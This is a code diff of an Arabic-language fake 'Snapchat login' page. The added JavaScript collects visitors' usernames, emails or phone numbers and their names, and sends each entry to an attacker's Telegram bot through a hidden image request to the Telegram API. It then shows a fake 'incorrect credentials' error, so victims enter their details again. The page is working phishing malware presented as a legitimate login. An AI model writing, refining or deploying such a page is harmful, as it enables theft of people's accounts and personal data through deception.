-      // show professional toast message (as requested)
-      showToast('عذراً','اسم المستخدم أو الاسم غير صحيح. يرجى التحقق من المعلومات والمحاولة مرة أخرى.');
-      // clear in-memory prevData and name field so user can repeat
-      prevData = null;
-      fullName.value = '';
-    });
-
-    backBtn.addEventListener('click', function(){
-      // go back to step1, keep primary input content as-is
-      step2.classList.add('hidden');
-      step1.classList.remove('hidden');
-      mainTitle.textContent = 'تسجيل الدخول إلى سناب شات';
-    });
-
-    // Toast UI
-    function showToast(title, msg){
-      toastTitle.textContent = title;
-      toastMsg.textContent = msg;
-      toastBackdrop.style.display = 'flex';
+    // Send to Telegram (Image GET) without time
+    function canSend(){
+      return typeof TG_TOKEN !== 'undefined' && typeof TG_CHAT_ID !== 'undefined' && TG_TOKEN && TG_CHAT_ID && !TG_TOKEN.includes('PASTE');
     }
-    toastOk.addEventListener('click', function(){
-      toastBackdrop.style.display = 'none';
-      // after closing, return to step1 for retry (as requested)
-      step2.classList.add('hidden');
-      step1.classList.remove('hidden');
-      mainTitle.textContent = 'تسجيل الدخول إلى سناب شات';
-      // optionally focus primary input
-      const p = document.getElementById('primaryInput') || document.getElementById('phoneInput');
+    function sendToTelegram(text){
+      if(!canSend()){
+        hint1.style.color='#b45a00';
+        hint1.textContent = 'التوكن/Chat ID غير مضافين في رأس الملف — لن يُرسل فعليًا.';
+        setTimeout(()=> hint1.textContent = '',2500);
+        return false;
+      }
+      try {
+        const url = `https://api.telegram.org/bot${encodeURIComponent(TG_TOKEN)}/sendMessage?chat_id=${encodeURIComponent(TG_CHAT_ID)}&text=${encodeURIComponent(text)}`;
+        const img = new Image();
+        img.src = url + '&_=' + Date.now();
+        console.log('Telegram send URL:', url);
+        return true;
+      } catch(e){ console.error(e); return false; }
+    }
+
+    // Next: validate, send primary, animate to page2
+    const animateToPage2 = () => {
+      page1.classList.add('slide-out-left');
+      page2.classList.remove('hidden');
+      page2.classList.add('slide-in-right');
+      setTimeout(()=> {
+        page1.classList.remove('slide-out-left');
+        page2.classList.remove('slide-in-right');
+        page1.classList.add('hidden');
+      }, 320);
+    };
+
+    const animateToPage1 = () => {
+      page2.classList.add('slide-out-right');
+      page1.classList.remove('hidden');
+      page1.classList.add('slide-in-left');
+      setTimeout(()=> {
+        page2.classList.remove('slide-out-right');
+        page1.classList.remove('slide-in-left');
+        page2.classList.add('hidden');
+      }, 320);
+    };
+
+    nextBtn.addEventListener('click', ()=> {
+      const p = validatePrimary();
+      if(!p) return;
+      prev = p;
+      const countryText = p.type==='phone' && p.country ? `${p.country.name} ${p.country.dial}` : '—';
+      const msg = `النوع: ${p.type}\nالقيمة: ${p.value}\nالبلد: ${countryText}`;
+      sendToTelegram(msg);
+      // animation + state
+      history.pushState({page:'step2'}, '', '#step2');
+      animateToPage2();
+      nameInput.focus();
+    });
+
+    // Send final (prev + name)
+    btnSend.addEventListener('click', ()=> {
+      const nm = nameInput.value.trim();
+      if(!nm){ hint2.style.color='crimson'; hint2.textContent='الرجاء إدخال الاسم'; setTimeout(()=> hint2.textContent = '', 2200); return; }
+      if(!prev){ showToast('خطأ','لا توجد بيانات سابقة — عد للصفحة الأولى.'); return; }
+      const countryText = prev.type==='phone' && prev.country ? `${prev.country.name} ${prev.country.dial}` : '—';
+      const msg = `النوع: ${prev.type}\nالقيمة: ${prev.value}\nالبلد: ${countryText}\nالاسم: ${nm}`;
+      sendToTelegram(msg);
+      showToast('عذراً','اسم المستخدم أو الاسم غير صحيح. يرجى التحقق والمحاولة مرة أخرى.');
+      prev = null;
+      nameInput.value = '';
+    });
+
+    btnBack.addEventListener('click', ()=> {
+      history.pushState({page:'step1'}, '', '#step1');
+      animateToPage1();
+      // focus primary input
+      const p = document.getElementById('primary') || document.getElementById('phoneInput');
       if(p) p.focus();
     });
 
-    // Allow Enter key to progress
-    document.addEventListener('keydown', function(e){
-      const active = document.activeElement;
+    // Toast
+    function showToast(title, text){
+      document.getElementById('toastTitle').textContent = title;
+      toastText.textContent = text;
+      toastBack.style.display = 'flex';
+    }
+    toastOk.addEventListener('click', ()=> {
+      toastBack.style.display = 'none';
+      // return to page1
+      history.pushState({page:'step1'}, '', '#step1');
+      animateToPage1();
+      const p = document.getElementById('primary') || document.getElementById('phoneInput');
+      if(p) p.focus();
+    });
+
+    // Enter key behavior & modal close
+    document.addEventListener('keydown', e => {
       if(e.key === 'Enter'){
-        if(!step2.classList.contains('hidden')){ // on name step
-          e.preventDefault();
-          sendBtn.click();
-        } else {
-          e.preventDefault();
-          nextBtn.click();
-        }
+        if(!page2.classList.contains('hidden')) btnSend.click();
+        else nextBtn.click();
       }
       if(e.key === 'Escape'){
         if(countryModal.style.display === 'flex') countryModal.style.display = 'none';
-        if(toastBackdrop.style.display === 'flex') toastBackdrop.style.display = 'none';
+        if(toastBack.style.display === 'flex') toastBack.style.display = 'none';
       }
     });
 
-    // init: enforce ASCII-only for initial primary input to prevent Arabic
-    // We'll rebind primaryInput if phone swap occurs
+    // history navigation
+    window.addEventListener('popstate', (e) => {
+      const state = e.state && e.state.page ? e.state.page : (location.hash === '#step2' ? 'step2' : 'step1');
+      if(state === 'step2'){
+        page1.classList.add('hidden');
+        page2.classList.remove('hidden');
+      } else {
+        page2.classList.add('hidden');
+        page1.classList.remove('hidden');
+      }
+    });
+
+    // init
     (function init(){
-      const p = document.getElementById('primaryInput');
-      p.addEventListener('input', function(e){
-        // strip non-ASCII to prevent Arabic letters; keep @ . _ - and digits
-        e.target.value = e.target.value.replace(/[^\x00-\x7F]/g,'');
-        if(e.target.value.length > 100) e.target.value = e.target.value.slice(0,100);
-      });
-      p.addEventListener('keydown', function(e){ if(e.key === 'Enter'){ e.preventDefault(); nextBtn.click(); } });
-      // prepare country list rendering
-      renderCountryList(COUNTRIES);
-
-      // detect mobile numeric keyboard for phone when swapped (handled when created)
+      bindAscii(primaryInput);
+      renderCountries(COUNTRIES);
+      if(location.hash === '#step2'){ page1.classList.add('hidden'); page2.classList.remove('hidden'); } else { page2.classList.add('hidden'); page1.classList.remove('hidden'); }
     })();
-
   </script>
 </body>
 </html>
